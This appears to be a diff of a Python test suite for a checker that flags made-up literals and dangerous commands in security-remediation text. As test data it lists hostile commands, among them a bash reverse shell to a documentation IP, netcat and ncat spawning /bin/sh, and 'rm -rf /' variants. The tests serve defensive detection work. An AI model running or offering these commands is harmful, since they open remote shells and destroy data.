@@ -68,7 +68,6 @@ def test_ordinary_prose_has_none(prose):
         ("curl -o f http://x.example/f", "a download over plain HTTP"),
         ("echo aGk= | base64 -d", "base64-decoded code"),
         ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "a /dev/tcp connection"),
-        ("sh -c 'id'", "a shell given a command string"),
         ("nc -lvp 4444 -e /bin/sh", "netcat running a program"),
         ("rm -rf / --no-preserve-root", "deleting from the root"),
         ("chmod +x fix.sh", "making a file executable"),
@@ -471,3 +470,90 @@ def test_a_url_is_the_sources_only_whole():
     said = f"{GOOD['references'][0]} https://x.example/a?b=1"
     answer = _answer(remediation=["See https://x.example/a for it."])
     assert "a URL no source gives: https://x.example/a" in _check(answer, said).problems
+
+
+# from the third review of A.6
+
+
+@pytest.mark.parametrize(
+    ("source_has", "prose_has"),
+    [
+        ("ships the google.golang.org/api client", "Update the google.golang.org/api client."),
+        ("in github.com/containerd/containerd", "See github.com/containerd/containerd."),
+        (
+            "see https://access.redhat.com/solutions/41278",
+            "as access.redhat.com/solutions/41278 says",
+        ),
+        ("put it in `/etc/modprobe.d/`", "create a file in /etc/modprobe.d with it"),
+        ("listening on 127.0.0.1:11211", "Keep it bound to 127.0.0.1 only."),
+        ("the trusted network 192.168.1.0/24", "Allow it only from 192.168.1.0/24."),
+        ("error at file.c:3215", "The crash is in /src/file.c here." and "Read file.c:3215."),
+    ],
+)
+def test_a_literal_copied_from_a_source_is_found_in_it(source_has, prose_has):
+    said = f"{GOOD['references'][0]}\n{source_has}"
+    assert _check(_answer(remediation=[prose_has]), said).problems == []
+
+
+@pytest.mark.parametrize(
+    "written",
+    [
+        "See \u201chttps://access.redhat.com/solutions/41278\u201d for it.",
+        "Is it at https://access.redhat.com/solutions/41278?",
+    ],
+)
+def test_a_url_copied_with_its_quotes_or_question_mark_is_the_sources(written):
+    said = f"{GOOD['references'][0]} See \u201chttps://access.redhat.com/solutions/41278\u201d."
+    assert _check(_answer(remediation=[written]), said).problems == []
+
+
+def test_a_made_up_address_ending_a_sentence_is_found():
+    problems = _check(_answer(remediation=["Block 203.0.113.5."]), GOOD["references"][0]).problems
+    assert "an address no source gives: 203.0.113.5" in problems
+
+
+@pytest.mark.parametrize(
+    "fragment", ["session.upload_progress", "upload_progress.enabled", "enabled"]
+)
+def test_part_of_a_sources_setting_isnt_a_setting_it_names(fragment):
+    mitigation = (
+        f"- id: off\n  setting: {{kind: php_ini, name: {fragment}}}\n"
+        "  expect: 'off'\n  default: 'on'\n  text: Turn it off until PHP is fixed.\n"
+    )
+    said = f"{GOOD['references'][0]} Set session.upload_progress.enabled = Off."
+    problems = _check(_answer(mitigations_yaml=mitigation), said).problems
+    assert f"a setting no source gives: {fragment}" in problems
+
+
+@pytest.mark.parametrize(
+    "prose",
+    ["Run `rm -rf /`.", "Run `rm -rf /*`.", "rm -rf /.", "sudo rm -rf /;", 'rm -rf "/"',
+     "chmod -R 777 /srv", "chmod --recursive +x /srv", "ncat --exec /bin/sh -l 4444"],
+)  # fmt: skip
+def test_the_third_reviews_dangerous_forms_are_refused(prose):
+    assert textcheck.dangers(prose), prose
+
+
+@pytest.mark.parametrize(
+    "prose",
+    [
+        "Run chmod 700 ~/.ssh and chmod 750 the directory.",
+        "Restore it with chmod 0755 /usr/bin/pkexec.",
+        "Check the header with curl -sI https://x.example | grep -i server.",
+        "Avoid passing user input to eval().",
+        "curl follows a redirect from https:// to http:// in this bug.",
+        "Apply it with sudo sh -c 'echo 0 > /proc/sys/kernel/unprivileged_bpf_disabled'.",
+        "Check with nc -vz host 22 and grep -e the log.",
+    ],
+)
+def test_the_third_reviews_ordinary_wording_isnt_dangerous(prose):
+    assert textcheck.dangers(prose) == [], textcheck.dangers(prose)
+
+
+def test_dollar_paren_runs_are_read_quickly():
+    import time
+
+    start = time.monotonic()
+    textcheck.literals("$(" * 32_000)
+    textcheck.literals("$(a" * 21_000)
+    assert time.monotonic() - start < 3.0
